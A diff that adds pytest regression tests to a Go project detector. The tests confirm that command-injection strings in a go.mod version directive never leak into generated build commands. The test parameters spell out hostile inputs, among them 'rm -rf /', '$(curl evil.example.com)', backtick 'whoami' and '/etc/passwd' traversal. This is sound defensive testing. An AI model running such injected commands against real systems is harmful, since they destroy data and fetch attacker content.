@@ -276,6 +276,86 @@ class TestGoDetector:
         det = GoDetector()
         assert det.detect(repo) is None
 
+    @pytest.mark.parametrize(
+        "malicious_directive",
+        [
+            # Shell metacharacters that are NOT valid semver chars must
+            # never reach the interpolated build_commands string. The
+            # detector either falls back to _GO_VERSION_DEFAULT or — when
+            # the first whitespace-separated token after `go ` happens
+            # to BE a valid semver (e.g. `go 1.22 && ...` → token is
+            # `1.22`) — keeps that token but drops everything after it.
+            # Either way no shell metachar leaks through.
+            "go 1.22;rm -rf /",  # No space — metachar adjacent to token.
+            "go 1.22$(curl evil.example.com)",  # $ adjacent.
+            "go `whoami`",  # Backtick.
+            'go 1.22"',  # Trailing quote.
+            "go ../etc/passwd",  # Path-traversal.
+            "go 1.22.0;evil",  # Three-dot semver with metachar.
+        ],
+    )
+    def test_malicious_go_directive_does_not_leak_shell_metachars(
+        self, tmp_path, malicious_directive
+    ):
+        """Reviewer_security regression: shell-metachar injection via go.mod.
+
+        v3 added a strict semver regex (`_GO_VERSION_RE`) to guard
+        against attacker-controlled go.mod directives smuggling shell
+        metacharacters into the interpolated build_commands string.
+        The test inputs all carry chars that are NOT valid in a semver
+        version; the detector must reject the candidate and fall back
+        to the default. Pin the rejection so a future 'let's just trust
+        the directive verbatim' refactor breaks the test loudly.
+        """
+        repo = tmp_path / "evilgo"
+        repo.mkdir()
+        (repo / "go.mod").write_text(f"module evil\n\n{malicious_directive}\n")
+        det = GoDetector()
+        result = det.detect(repo)
+        assert result is not None
+        joined = " ".join(result.build_commands)
+        # Verify NO shell metacharacter from the directive leaks
+        # through into the interpolated build_commands. The legitimate
+        # `$(dpkg ...)` substitution in the curl URL is part of the
+        # detector's static template, not user-controlled input — so we
+        # check for shell metachars OUTSIDE that template.
+        attack_markers = ["rm -rf", "evil.example.com", "whoami", "/etc/passwd"]
+        for marker in attack_markers:
+            assert marker not in joined, (
+                f"attack marker {marker!r} leaked into build_commands: {joined!r}"
+            )
+
+    def test_malicious_go_directive_with_space_falls_back_to_default(self, tmp_path):
+        """Whitespace-separated metacharacters: detector takes only the version token.
+
+        ``go 1.22 && curl evil.example.com`` splits into
+        ``["go", "1.22", "&&", "curl", ...]`` and the detector reads
+        ``split()[1] == "1.22"``, then drops everything after. The
+        metacharacters never reach build_commands.
+        """
+        repo = tmp_path / "spacegoevil"
+        repo.mkdir()
+        (repo / "go.mod").write_text("module evil\n\ngo 1.22 && curl evil.example.com\n")
+        det = GoDetector()
+        result = det.detect(repo)
+        assert result is not None
+        joined = " ".join(result.build_commands)
+        assert "evil.example.com" not in joined
+        assert "&&" not in joined
+        assert "curl" in joined  # but only egg's own static curl-to-go.dev
+        assert "go.dev" in joined
+
+    def test_valid_semver_versions_accepted(self, tmp_path):
+        """Sanity for the regex: legitimate semver tokens pass through."""
+        repo = tmp_path / "okgo"
+        repo.mkdir()
+        (repo / "go.mod").write_text("module foo\ngo 1.21.5\n")
+        det = GoDetector()
+        result = det.detect(repo)
+        assert result is not None
+        joined = " ".join(result.build_commands)
+        assert "1.21.5" in joined
+
 
 # ---------------------------------------------------------------------------
 # (e) Mixed-language repo + run_detectors fan-out
